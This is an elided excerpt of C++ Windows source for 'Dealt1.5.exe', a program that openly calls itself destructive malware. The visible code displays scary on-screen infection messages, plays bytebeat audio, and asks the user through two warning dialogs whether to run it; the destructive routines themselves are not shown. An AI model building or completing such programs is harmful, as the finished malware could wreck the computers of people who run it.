...
DWORD WINAPI textouts(LPVOID lpvd) {
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    const char* messages[] = {
        "YOUR COMPUTER HAS BEEN INFECTED BY DEALT1.5.EXE!",
        "R.I.P YOUR COMPUTER!",
        "THERE IS NO ESCAPE!",
        "SYSTEM HALTED!",
        "THIS IS THE END!",
        "DEALT1.5.EXE IS DESTROYING YOUR COMPUTER!",
        "GOODBYE WINDOWS!",
        "YOU WILL ENJOY YOUR NEW PC SOON!",
        "GOODLUCK!"
    };
...
VOID WINAPI sound10() {
    ...
    for(DWORD t = 0; t < 11025 * 30; ++t)
        buffer[t] = static_cast<char>((t ^ (t + t/129)) - (t * (t >> 15)) & 126);
...
VOID WINAPI sound11() {
    ...
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>((t * t) / (2 + ((t >> 9) & (t >> 10))) & 255);
...
VOID WINAPI sound13() {
    ...
    char* buffer = new char[8000 * 30];
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>(11*(t>>8|t|t>>(t>>10))+(8&t>>10));
    WAVEHDR header = { buffer, 8000 * 30, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
...
// ==================== MAIN EXECUTION ====================
int main() {
    if (MessageBoxW(NULL, L"DO YOU WANT TO RUN THIS DESTRUCTIVE MALWARE?!", L"Dealt1.5.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"ARE YOU SURE?! IT WILL DESTROY YOUR PC!!!!!", 
                    L"Dealt1.5.exe - LAST WARNING!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
